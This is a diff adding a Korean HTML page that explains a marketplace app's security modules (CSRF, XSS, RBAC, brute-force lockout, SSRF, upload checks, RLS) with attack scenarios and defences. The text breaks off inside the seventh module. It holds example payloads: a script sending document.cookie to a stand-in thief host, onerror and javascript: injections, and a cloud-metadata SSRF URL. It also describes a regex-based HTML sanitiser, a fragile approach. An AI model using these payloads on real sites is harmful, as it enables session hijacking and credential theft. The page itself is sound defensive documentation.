@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SOGRA — 보안 적용 상세</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0a0e17;
+    --bg-soft: #131826;
+    --card: #1a2030;
+    --card-hi: #232a3d;
+    --border: #2a3344;
+    --text: #e5e7eb;
+    --muted: #94a3b8;
+    --dim: #64748b;
+    --green: #34d399;
+    --rose: #fb7185;
+    --amber: #fbbf24;
+    --sky: #38bdf8;
+    --violet: #a78bfa;
+    --pink: #ec4899;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Pretendard", "Apple SD Gothic Neo", sans-serif;
+    background:
+      radial-gradient(900px 500px at 20% -10%, rgba(52,211,153,.10), transparent 60%),
+      radial-gradient(800px 500px at 90% 10%, rgba(56,189,248,.08), transparent 60%),
+      var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    padding: 36px 18px 80px;
+  }
+  .container { max-width: 1280px; margin: 0 auto; }
+  header { text-align: center; margin-bottom: 36px; padding-bottom: 24px; border-bottom: 1px solid var(--border); }
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 5px 12px; border-radius: 999px;
+    border: 1px solid rgba(52,211,153,.35);
+    background: rgba(52,211,153,.08);
+    color: #6ee7b7; font-size: 12px; font-weight: 600;
+    margin-bottom: 14px;
+  }
+  h1 {
+    font-size: 34px; font-weight: 800; letter-spacing: -0.02em;
+    background: linear-gradient(90deg, #6ee7b7, #38bdf8);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  .subtitle { color: var(--muted); margin-top: 8px; font-size: 14px; }
+
+  h2 {
+    font-size: 22px; font-weight: 700;
+    margin: 48px 0 16px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  h2 .accent { width: 4px; height: 22px; border-radius: 2px; background: linear-gradient(180deg, #34d399, #38bdf8); }
+  h2 small { font-size: 12px; color: var(--muted); font-weight: 500; margin-left: 8px; }
+
+  /* ── 3-Zone 요약 ── */
+  .zones {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 12px;
+  }
+  .zone {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 20px;
+    position: relative;
+  }
+  .zone-num {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 28px; height: 28px;
+    border-radius: 8px;
+    font-weight: 700; font-size: 13px;
+    background: linear-gradient(135deg, #34d399, #38bdf8);
+    color: #0a0e17;
+    margin-bottom: 10px;
+  }
+  .zone h3 { font-size: 15px; font-weight: 700; }
+  .zone .where { font-size: 11px; color: var(--muted); margin-top: 2px; font-family: ui-monospace, monospace; }
+  .zone ul { list-style: none; margin-top: 14px; padding: 0; }
+  .zone li {
+    padding: 7px 10px;
+    border-radius: 6px;
+    margin-bottom: 4px;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    font-size: 12px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .zone li .pill {
+    font-size: 9px; font-weight: 700;
+    padding: 2px 6px; border-radius: 999px;
+    background: rgba(52,211,153,.15); color: #6ee7b7;
+    text-transform: uppercase; letter-spacing: 0.04em;
+  }
+
+  /* ── 모듈 카드 ── */
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+    gap: 14px;
+  }
+  .module {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+    transition: transform .15s, border-color .15s;
+  }
+  .module:hover { transform: translateY(-2px); border-color: #3b4660; }
+  .mod-head {
+    display: flex; align-items: flex-start; gap: 10px;
+    padding-bottom: 12px;
+    margin-bottom: 14px;
+    border-bottom: 1px dashed var(--border);
+  }
+  .mod-num {
+    width: 30px; height: 30px;
+    border-radius: 8px;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 800;
+    background: linear-gradient(135deg, #34d399, #38bdf8);
+    color: #0a0e17;
+    flex-shrink: 0;
+  }
+  .mod-title { flex: 1; }
+  .mod-name { font-size: 16px; font-weight: 700; }
+  .mod-tag {
+    display: inline-block;
+    font-size: 10px; font-weight: 600;
+    padding: 2px 7px; border-radius: 999px;
+    background: rgba(244,63,94,.12); color: #fda4af;
+    margin-top: 4px;
+  }
+  .owasp {
+    display: inline-block;
+    font-size: 9px; font-weight: 700;
+    padding: 2px 6px; border-radius: 4px;
+    background: rgba(167,139,250,.15); color: #c4b5fd;
+    margin-left: 4px;
+  }
+
+  .row {
+    margin-top: 12px;
+    display: grid;
+    grid-template-columns: 70px 1fr;
+    gap: 10px;
+    align-items: start;
+    font-size: 12.5px;
+    line-height: 1.6;
+  }
+  .row .lbl {
+    color: var(--muted);
+    font-weight: 600;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    padding-top: 1px;
+  }
+  .row .val { color: var(--text); }
+  .row .val.example {
+    background: var(--bg-soft);
+    border-left: 3px solid var(--rose);
+    padding: 8px 10px;
+    border-radius: 4px;
+    color: var(--muted);
+  }
+  .row .val.example b { color: var(--rose); }
+  .row .val.defense {
+    background: var(--bg-soft);
+    border-left: 3px solid var(--green);
+    padding: 8px 10px;
+    border-radius: 4px;
+    color: var(--muted);
+  }
+  .row .val.defense b { color: var(--green); }
+
+  .files {
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px dashed var(--border);
+  }
+  .files .lbl-top {
+    color: var(--muted);
+    font-weight: 600;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin-bottom: 6px;
+  }
+  .file {
+    display: block;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 5px 9px;
+    margin-top: 4px;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    font-size: 11px;
+    color: #cbd5e1;
+  }
+  .file .line { color: var(--amber); }
+
+  /* ── 매트릭스 ── */
+  .matrix {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 22px;
+    overflow-x: auto;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid var(--border); }
+  th {
+    color: var(--muted);
+    font-weight: 600;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    background: var(--bg-soft);
+  }
+  td.threat-cell { font-weight: 700; color: var(--rose); }
+  td.module-cell { color: var(--green); font-weight: 600; }
+  td.path { font-family: ui-monospace, monospace; font-size: 11px; color: #cbd5e1; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover { background: rgba(255,255,255,.02); }
+
+  /* ── 플로우 ── */
+  .flow {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 22px;
+    overflow-x: auto;
+  }
+  .flow-row {
+    display: flex; align-items: stretch; gap: 8px;
+    min-width: 920px;
+  }
+  .flow-node {
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px 12px;
+    flex: 1;
+    display: flex; flex-direction: column;
+  }
+  .flow-node .ico { font-size: 22px; }
+  .flow-node .label { font-size: 13px; font-weight: 700; margin-top: 6px; }
+  .flow-node .checks {
+    font-size: 10px; color: var(--green); margin-top: 8px;
+    line-height: 1.55;
+    font-family: ui-monospace, monospace;
+  }
+  .flow-node .checks .x { color: var(--muted); }
+  .flow-arrow {
+    color: var(--dim); font-size: 18px; align-self: center;
+  }
+
+  /* ── 공격 시나리오 ── */
+  .attack {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+    margin-bottom: 12px;
+  }
+  .attack-head {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 10px;
+  }
+  .attack-num {
+    width: 26px; height: 26px;
+    border-radius: 50%;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700;
+    background: var(--rose);
+    color: #0a0e17;
+  }
+  .attack h3 { font-size: 15px; font-weight: 700; }
+  .attack-flow {
+    display: grid;
+    grid-template-columns: 1fr 30px 1fr 30px 1fr;
+    gap: 8px;
+    align-items: stretch;
+    margin-top: 8px;
+  }
+  .attack-step {
+    background: var(--bg-soft);
+    border-radius: 8px;
+    padding: 10px 12px;
+    font-size: 12px;
+  }
+  .attack-step.bad { border-left: 3px solid var(--rose); }
+  .attack-step.guard { border-left: 3px solid var(--amber); }
+  .attack-step.safe { border-left: 3px solid var(--green); }
+  .attack-step .who { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.04em; }
+  .attack-step .what { font-weight: 600; margin-top: 4px; }
+  .attack-arrow {
+    color: var(--dim);
+    align-self: center;
+    text-align: center;
+    font-size: 16px;
+  }
+
+  /* ── 요약 ── */
+  .summary {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 12px;
+    margin-top: 12px;
+  }
+  .stat {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .stat .num { font-size: 28px; font-weight: 800; color: #6ee7b7; }
+  .stat .label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+
+  @media (max-width: 820px) {
+    .zones { grid-template-columns: 1fr; }
+    .attack-flow { grid-template-columns: 1fr; }
+    .attack-arrow { display: none; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="badge">◆ SOGRA · Security Detail · OWASP Top 10 매핑</div>
+    <h1>장터한상 — 보안 적용 상세</h1>
+    <p class="subtitle">코드 어디에 어떤 방패가 있고, 어떤 공격을 어떻게 막는지 (비유 + 실제 시나리오 포함)</p>
+  </header>
+
+  <!-- 한 줄 요약 -->
+  <div class="summary">
+    <div class="stat"><div class="num">7</div><div class="label">보안 모듈</div></div>
+    <div class="stat"><div class="num">9+</div><div class="label">방어 대상 위협</div></div>
+    <div class="stat"><div class="num">11</div><div class="label">적용 코드 위치</div></div>
+    <div class="stat"><div class="num">3-Zone</div><div class="label">입구·중간·최후방</div></div>
+  </div>
+
+  <!-- 3-Zone 요약 -->
+  <h2><span class="accent"></span>3-Zone 검문 — 한눈에 요약</h2>
+  <div class="zones">
+    <div class="zone">
+      <div class="zone-num">1</div>
+      <h3>🚪 입구</h3>
+      <p class="where">middleware.ts + /api/auth/*</p>
+      <ul>
+        <li><span class="pill">CSRF</span> 위조 요청 차단</li>
+        <li><span class="pill">BF</span> 5회 실패 = 15분 잠금</li>
+        <li><span class="pill">JWT</span> 세션 자동 갱신</li>
+      </ul>
+    </div>
+    <div class="zone">
+      <div class="zone-num">2</div>
+      <h3>🛂 중간</h3>
+      <p class="where">app/api/**/route.ts</p>
+      <ul>
+        <li><span class="pill">RBAC</span> 권한 = role 확인</li>
+        <li><span class="pill">Zod</span> 입력값 형식 검증</li>
+        <li><span class="pill">XSS</span> 위험 태그 제거</li>
+        <li><span class="pill">SSRF</span> 외부 URL 화이트리스트</li>
+        <li><span class="pill">Upload</span> 매직넘버 검증</li>
+      </ul>
+    </div>
+    <div class="zone">
+      <div class="zone-num">3</div>
+      <h3>🏰 최후방</h3>
+      <p class="where">Supabase Postgres</p>
+      <ul>
+        <li><span class="pill">RLS</span> 본인 데이터만 보임</li>
+        <li><span class="pill">SQLi</span> ORM 자동 escape</li>
+        <li><span class="pill">bcrypt</span> 비번 단방향 해시</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- 보안 모듈 카드 (비유 + 시나리오 포함) -->
+  <h2><span class="accent"></span>보안 모듈 7종 상세 <small>각 카드에 비유·공격 예시·우리 방어 포함</small></h2>
+  <div class="grid">
+
+    <!-- 1) CSRF -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">1</span>
+        <div class="mod-title">
+          <div class="mod-name">CSRF — 위조 요청 차단</div>
+          <span class="mod-tag">A01:2021 Broken Access Control</span>
+          <span class="owasp">A08 Software Integrity</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">한 줄</span><span class="val"><b>"내가 한 적 없는데 내 계정으로 행해진 요청"</b> 을 막는 기술. 사용자 모르게 그 사람 권한으로 요청을 보내는 공격을 차단.</span></div>
+
+      <div class="row"><span class="lbl">왜 생김</span><span class="val">브라우저는 어떤 사이트로 요청을 보내든 그 사이트에 저장된 <b>쿠키(로그인 세션 포함)를 자동으로 같이 전송</b>해. 그래서 사용자가 우리 사이트에 로그인한 상태에서 다른 사이트(악성)를 열면, 그 악성 사이트에서 우리 사이트로 요청 보내도 쿠키가 자동으로 같이 가서 <b>서버 입장에선 진짜 사용자 요청과 구분 안 됨</b>.</span></div>
+
+      <div class="row"><span class="lbl">공격 시나리오</span><span class="val example">
+        1. 사용자가 장터한상에 로그인 (쿠키에 세션 저장됨)<br>
+        2. 다른 탭에서 악성 블로그 클릭<br>
+        3. 악성 페이지에 숨겨진 코드: <b>&lt;img src="https://sogra-hackathon.vercel.app/api/orders?items=상품X1000"&gt;</b><br>
+        4. 브라우저가 이미지인 줄 알고 요청 전송 + 쿠키 자동 동봉<br>
+        5. 서버는 "로그인된 사용자가 주문함"으로 처리 → <b>사용자 모르게 1000개 결제됨</b>
+      </span></div>
+
+      <div class="row"><span class="lbl">왜 쿠키만으론 못 막나</span><span class="val">쿠키는 어차피 같은 도메인으로 가는 모든 요청에 자동 동봉됨. 서버는 "이 요청이 우리 사이트 폼에서 왔는지 / 외부에서 왔는지" 구분할 방법이 없음. → <b>"쿠키 + 추가 증거"</b> 가 필요.</span></div>
+
+      <div class="row"><span class="lbl">우리 방어</span><span class="val defense">
+        <b>Double-Submit Cookie</b>: 우리만 만들 수 있는 랜덤 토큰을 발급해서 <b>쿠키 + HTTP 헤더 양쪽에 똑같이</b> 보내게 함. 서버는 쿠키 값 ≡ 헤더 값 같으면 통과.<br><br>
+        <b>왜 동작?</b> 악성 사이트는 우리 사이트의 쿠키를 <b>JavaScript로 읽을 수 없음</b> (Same-Origin Policy). 쿠키 자동 동봉은 되지만 그 값을 <b>헤더에 똑같이 넣을 방법이 없음</b> → 토큰 불일치 → 403 차단.
+      </span></div>
+
+      <div class="row"><span class="lbl">동작 단계</span><span class="val" style="font-family: ui-monospace, monospace; font-size: 11.5px; line-height: 1.75;">
+        ① 사용자 접속 → middleware가 랜덤 32바이트 토큰 생성 →<br>
+        &nbsp;&nbsp;&nbsp;<b>Set-Cookie: sogra_csrf=ab12...cd</b><br><br>
+        ② 사용자 폼 제출 → 클라이언트 JS가 cookie 값 읽음 →<br>
+        &nbsp;&nbsp;&nbsp;<b>fetch("/api/orders", { headers: { "x-csrf-token": "ab12...cd" } })</b><br><br>
+        ③ 서버 verifyCsrf(req):<br>
+        &nbsp;&nbsp;&nbsp;cookie.sogra_csrf === header["x-csrf-token"] ? OK : 403
+      </span></div>
+
+      <div class="row"><span class="lbl">추가 보호</span><span class="val">
+        • <b>Constant-time 비교</b>: 토큰을 char별로 비교할 때 일치/불일치까지 걸리는 시간 차이를 노리는 <b>timing attack</b> 방어<br>
+        • <b>32바이트 = 64 hex chars</b>: 무작위 추측 사실상 불가 (2^256)
+      </span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/csrf.ts <span class="line">— generateToken / verifyCsrf / ensureCsrfCookie</span></span>
+        <span class="file">middleware.ts<span class="line">:7</span> — 모든 요청에 sogra_csrf 쿠키 자동 발급</span>
+        <span class="file">lib/csrf-client.ts — 클라이언트 fetch wrapper (헤더 자동 부착)</span>
+        <span class="file">app/api/auth/login, signup, /api/products, /api/orders, /api/reviews, /api/upload — 모든 POST 진입에서 verifyCsrf</span>
+      </div>
+    </div>
+
+    <!-- 2) XSS -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">2</span>
+        <div class="mod-title">
+          <div class="mod-name">XSS — 스크립트 주입 차단</div>
+          <span class="mod-tag">Cross-Site Scripting</span>
+          <span class="owasp">A03 Injection</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">한 줄</span><span class="val"><b>"사용자 입력에 숨겨진 코드가 다른 사람 브라우저에서 실행되는"</b> 공격. 결과: 쿠키·세션·개인정보 탈취, 가짜 페이지 띄우기, 자동 송금까지.</span></div>
+
+      <div class="row"><span class="lbl">왜 생김</span><span class="val">웹페이지는 HTML로 그려지는데, HTML 안에 <b>&lt;script&gt;</b> 태그가 있으면 브라우저가 <b>그냥 그 코드를 실행</b>해. 그래서 사용자가 입력한 문자열을 그대로 페이지에 박으면, 그 안에 &lt;script&gt; 가 있을 경우 다음 방문자가 그 페이지 열 때 <b>자동으로 실행됨</b>.</span></div>
+
+      <div class="row"><span class="lbl">3가지 종류</span><span class="val">
+        ① <b>Stored XSS</b> (가장 위험) — DB에 저장된 악성 코드 (예: 리뷰·게시글). 모든 방문자가 영향받음.<br>
+        ② <b>Reflected XSS</b> — URL 파라미터로 즉시 반사 (예: /search?q=&lt;script&gt;...). 링크 클릭 유도형.<br>
+        ③ <b>DOM XSS</b> — 클라이언트 JS가 innerHTML로 사용자 입력 직접 박을 때.
+      </span></div>
+
+      <div class="row"><span class="lbl">공격 시나리오</span><span class="val example">
+        1. 악성 사용자가 어떤 상품 리뷰에 다음을 작성:<br>
+        &nbsp;&nbsp;&nbsp;<b>&lt;script&gt;fetch('https://도둑.com/steal', { method:'POST', body: document.cookie })&lt;/script&gt;</b><br><br>
+        2. 옛날 시스템이면 그대로 DB에 저장 → 그대로 페이지에 박힘<br>
+        3. 다른 방문자가 그 상품 페이지 열면 → 브라우저가 &lt;script&gt; <b>자동 실행</b><br>
+        4. 방문자의 세션 쿠키가 도둑 서버로 전송<br>
+        5. 도둑이 그 쿠키로 그 사람 계정 로그인 → <b>계정 탈취 완료</b>
+      </span></div>
+
+      <div class="row"><span class="lbl">이벤트 핸들러로도 가능</span><span class="val example">
+        &lt;script&gt; 없이도 위험:<br>
+        &nbsp;&nbsp;<b>&lt;img src="x" onerror="alert(document.cookie)"&gt;</b><br>
+        이미지가 안 보이니까 onerror 핸들러가 실행 → 코드 실행.<br>
+        같은 식으로 onclick, onmouseover, onload 등 모두 위험.
+      </span></div>
+
+      <div class="row"><span class="lbl">javascript: 스킴</span><span class="val example">
+        링크 hrefs도 위험: <b>&lt;a href="javascript:alert(1)"&gt;클릭&lt;/a&gt;</b><br>
+        사용자가 클릭하면 JS 실행.
+      </span></div>
+
+      <div class="row"><span class="lbl">우리 방어 — 2단계</span><span class="val defense">
+        <b>① 입력 시점 (서버) — sanitizeHtml() / stripHtml()</b><br>
+        DB에 저장하기 전에 위험 요소 제거:<br>
+        &nbsp;&nbsp;• &lt;script&gt;, &lt;iframe&gt;, &lt;style&gt;, &lt;form&gt;, &lt;link&gt;, &lt;meta&gt; 태그 통째로 삭제<br>
+        &nbsp;&nbsp;• 모든 on* 이벤트 핸들러 (onclick, onerror, …) 제거<br>
+        &nbsp;&nbsp;• javascript: 스킴 제거<br>
+        &nbsp;&nbsp;• 허용 태그(&lt;b&gt;, &lt;i&gt;, &lt;p&gt;, &lt;br&gt;)는 유지<br><br>
+        <b>② 출력 시점 (React) — 기본 escape</b><br>
+        React가 <b>{value}</b>로 렌더하면 자동으로 &lt;를 &amp;lt;로 escape → 텍스트로만 보임. 위험한 건 <b>dangerouslySetInnerHTML</b> 쓸 때만이라 그 자리에서 한 번 더 sanitize.
+      </span></div>
+
+      <div class="row"><span class="lbl">동작 단계</span><span class="val" style="font-family: ui-monospace, monospace; font-size: 11.5px; line-height: 1.75;">
+        ① 사용자: POST /api/reviews body: { content: "&lt;script&gt;xxx()&lt;/script&gt;정성스러운 후기" }<br><br>
+        ② 서버 sanitizeHtml(content):<br>
+        &nbsp;&nbsp;&nbsp;정규식 매칭으로 &lt;script&gt;...&lt;/script&gt; 통째 삭제<br>
+        &nbsp;&nbsp;&nbsp;결과: "정성스러운 후기"<br><br>
+        ③ DB.insert(reviews, { content: "정성스러운 후기" })<br><br>
+        ④ 다른 방문자: GET /product/[id]<br>
+        &nbsp;&nbsp;&nbsp;React: &lt;p&gt;{review.content}&lt;/p&gt; → "정성스러운 후기" 텍스트로만 표시
+      </span></div>
+
+      <div class="row"><span class="lbl">방식</span><span class="val">regex 자체 구현 (Vercel Fluid Compute에서 jsdom/DOMPurify가 ESM 충돌로 깨져서 자체 작성)</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/sanitize.ts <span class="line">— sanitizeHtml (허용태그 유지) / stripHtml (전체 태그 제거)</span></span>
+        <span class="file">/api/auth/login<span class="line">:26</span> — email stripHtml</span>
+        <span class="file">/api/auth/signup<span class="line">:31</span> — displayName stripHtml</span>
+        <span class="file">/api/recommend<span class="line">:54-56</span> — target/occasion/preference (Gemini 프롬프트 인젝션 완화)</span>
+        <span class="file">/api/products<span class="line">:109,114</span> — name stripHtml + description sanitizeHtml</span>
+        <span class="file">/api/reviews — 리뷰 본문 sanitize</span>
+        <span class="file">app/product/[id]/page.tsx — dangerouslySetInnerHTML 직전 sanitize 추가</span>
+      </div>
+    </div>
+
+    <!-- 3) RBAC -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">3</span>
+        <div class="mod-title">
+          <div class="mod-name">RBAC — 권한 우회 차단</div>
+          <span class="mod-tag">IDOR · Privilege Escalation</span>
+          <span class="owasp">A01 Broken Access Control</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">비유</span><span class="val">회사 출입증. <b>셀러 출입증</b>은 셀러 구역만, <b>관리자 출입증</b>으로만 관리자방 입장.</span></div>
+      <div class="row"><span class="lbl">공격</span><span class="val example">일반 구매자가 URL창에 <b>https://.../admin</b> 직접 타이핑 → 어드민 권한 없는데 관리자 페이지 진입 + 상품 막 승인.</span></div>
+      <div class="row"><span class="lbl">우리</span><span class="val defense"><b>3겹 방어</b>: ① middleware가 진입 시 user.role 확인 → /admin·/seller 차단. ② API route가 requireRole 한 번 더. ③ DB의 RLS가 마지막 방패.</span></div>
+      <div class="row"><span class="lbl">방식</span><span class="val">is_admin() SECURITY DEFINER 함수로 RLS 재귀 방지 (migration 0002)</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/rbac.ts <span class="line">— requireRole(['seller','admin'])</span></span>
+        <span class="file">/api/products<span class="line">:47</span> — 상품 등록 = seller·admin만</span>
+        <span class="file">/api/admin/products/[id] — 상품 승인 = admin만</span>
+        <span class="file">lib/supabase/middleware.ts<span class="line">:35-59</span> — /cart·/seller·/admin 진입 차단</span>
+        <span class="file">supabase/migrations/0002_fix_rls_recursion.sql</span>
+      </div>
+    </div>
+
+    <!-- 4) BruteForce -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">4</span>
+        <div class="mod-title">
+          <div class="mod-name">BruteForce 잠금 — 비번 무차별 대입 차단</div>
+          <span class="mod-tag">Credential Stuffing</span>
+          <span class="owasp">A07 Auth Failures</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">비유</span><span class="val">핸드폰 비번 5번 틀리면 <b>"잠시 잠금"</b>. 도둑이 1234부터 9999까지 다 시도해도 못 들어감.</span></div>
+      <div class="row"><span class="lbl">공격</span><span class="val example">봇이 admin@admin.com 으로 초당 1000번 비번 시도. 매번 다른 비번. 운 좋으면 24시간 안에 뚫림.</span></div>
+      <div class="row"><span class="lbl">우리</span><span class="val defense"><b>login_attempts 테이블</b>에 모든 시도(성공·실패) 기록. 5회 실패 누적되면 15분 잠금 + Retry-After 헤더로 클라이언트에 알림.</span></div>
+      <div class="row"><span class="lbl">방식</span><span class="val">+ Supabase 비번은 bcrypt 단방향 해시 (DB 탈취돼도 비번 복원 불가)</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/bruteforce.ts <span class="line">— checkBruteForce / recordLoginAttempt</span></span>
+        <span class="file">/api/auth/login<span class="line">:30-39, 48, 58</span> — 시도 전 체크 + 결과 기록</span>
+        <span class="file">DB: public.login_attempts (service-role only RLS)</span>
+      </div>
+    </div>
+
+    <!-- 5) SSRF -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">5</span>
+        <div class="mod-title">
+          <div class="mod-name">SSRF 방어 — 내부망 스캔 차단</div>
+          <span class="mod-tag">Server-Side Request Forgery</span>
+          <span class="owasp">A10 SSRF</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">한 줄</span><span class="val">사용자가 입력한 URL을 우리 서버가 fetch하다가 <b>"내부망 / 사설IP / 클라우드 메타데이터"</b>를 노출하는 공격 차단.</span></div>
+
+      <div class="row"><span class="lbl">공격</span><span class="val example">셀러가 이미지 URL 입력란에 <b>https://169.254.169.254/latest/meta-data/iam/security-credentials/</b> 입력 → 우리 서버가 그걸 fetch → AWS IAM 토큰 응답으로 받음 → 그 토큰이 어딘가에 노출되면 → <b>클라우드 전체 장악</b>.</span></div>
+
+      <div class="row"><span class="lbl">우리 방어 — 7단계 검증</span><span class="val defense">
+        <b>① 프로토콜</b>: https: 만 허용 → file:, ftp:, data:, javascript:, blob: 차단<br>
+        <b>② Credential URL</b>: https://user:pass@host 형식 차단<br>
+        <b>③ Hostname 패턴</b>: localhost, *.local, *.internal 차단<br>
+        <b>④ 리터럴 IP 차단 대역</b>:<br>
+        &nbsp;&nbsp;IPv4 — 10/8, 172.16/12, 192.168/16, 127/8 (loopback), 0/8, <b>169.254/16 (AWS metadata)</b>, 100.64/10 (CGNAT), 224+ (멀티캐스트)<br>
+        &nbsp;&nbsp;IPv6 — ::1, fc00/7 (ULA), fe80 (link-local), ff00 (멀티캐스트), ::ffff: (IPv4-mapped)<br>
+        <b>⑤ 화이트리스트</b>: ALLOWED_IMAGE_HOSTS env + 서브도메인 매칭<br>
+        <b>⑥ DNS Rebinding 방어</b>: hostname → DNS 해석 → A/AAAA 결과가 사설 IP면 차단<br>
+        <b>⑦ 리다이렉트 hop 검증</b>: 301/302 따라갈 때마다 매 hop 재검증 (최대 5회)
+      </span></div>
+
+      <div class="row"><span class="lbl">DNS Rebinding 이란</span><span class="val">
+        악성사이트가 <b>attacker.com</b> 도메인 등록 → DNS TTL 매우 짧게 → 첫 응답은 정상 IP, 두 번째 응답은 169.254.169.254 같은 내부 IP. 우리 서버가 hostname 검증만 하면 통과 → 두 번째 DNS 조회 때 내부 IP로 fetch → 침해. <br><br>
+        → <b>isUrlSafeWithDns()</b> 가 DNS 해석 결과 자체를 검증해서 우회 차단.
+      </span></div>
+
+      <div class="row"><span class="lbl">리다이렉트 공격</span><span class="val">
+        공격자: <b>https://innocent.com/redirect</b> 등록 → 그 URL이 302로 169.254.169.254 응답. 첫 URL 검증만 하면 통과되고 fetch가 리다이렉트 따라가서 침해. <br><br>
+        → <b>fetchWithRedirectGuard()</b> 가 redirect:"manual"로 hop 받아서 매번 다시 검증.
+      </span></div>
+
+      <div class="row"><span class="lbl">방식</span><span class="val">자동 매핑(Naver/Pexels)은 신뢰된 내부 호출이라 SSRF 체크 우회. <b>사용자 입력 URL만 isUrlSafe()</b>.</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/ssrf.ts <span class="line">— isUrlSafe (동기) / isUrlSafeWithDns (DNS) / fetchWithRedirectGuard (리다이렉트)</span></span>
+        <span class="file">/api/products<span class="line">:59-67</span> — 사용자 입력 image_url 검사 (isUrlSafe)</span>
+        <span class="file">env: ALLOWED_IMAGE_HOSTS — images.unsplash.com, cdn.pixabay.com, picsum.photos, supabase.co, images.pexels.com</span>
+      </div>
+    </div>
+
+    <!-- 6) Upload -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">6</span>
+        <div class="mod-title">
+          <div class="mod-name">파일 업로드 검증 — 위장 파일 차단</div>
+          <span class="mod-tag">Unrestricted File Upload</span>
+          <span class="owasp">A05 Security Misconfiguration</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">비유</span><span class="val">"고양이.jpg"라고 적어놨지만 <b>실제로는 바이러스</b>인 파일. 진짜 이미지는 첫 바이트가 정해진 패턴이라 검증 가능.</span></div>
+      <div class="row"><span class="lbl">공격</span><span class="val example">셀러가 <b>malware.php</b>를 <b>cute.jpg</b>로 이름만 바꿔 업로드 → 서버에 저장 → 그 URL 접근 시 PHP 실행 → 서버 장악.</span></div>
+      <div class="row"><span class="lbl">우리</span><span class="val defense"><b>3중 검증</b>: ① MIME (image/jpeg/png/webp만) ② 확장자 (.jpg/.png/.webp만) ③ <b>매직넘버</b> (파일 첫 3~4바이트가 진짜 JPEG/PNG 시그니처인지). 5MB 초과도 차단.</span></div>
+
+      <div class="files">
+        <div class="lbl-top">코드 위치</div>
+        <span class="file">lib/security/upload.ts <span class="line">— validateUpload(File)</span></span>
+        <span class="file">/api/upload/route.ts</span>
+      </div>
+    </div>
+
+    <!-- 7) RLS + SQLi -->
+    <div class="module">
+      <div class="mod-head">
+        <span class="mod-num">7</span>
+        <div class="mod-title">
+          <div class="mod-name">RLS + SQLi 방어 — DB 직접 침입 차단</div>
+          <span class="mod-tag">SQL Injection · IDOR</span>
+          <span class="owasp">A01 + A03</span>
+        </div>
+      </div>
+
+      <div class="row"><span class="lbl">비유</span><span class="val">은행 금고 <b>두 겹 잠금</b>. 자물쇠1: 마법 주문(SQL 인젝션) 글자로 처리. 자물쇠2: 내 통장은 나만 볼 수 있게 DB가 자동 검증.</span></div>
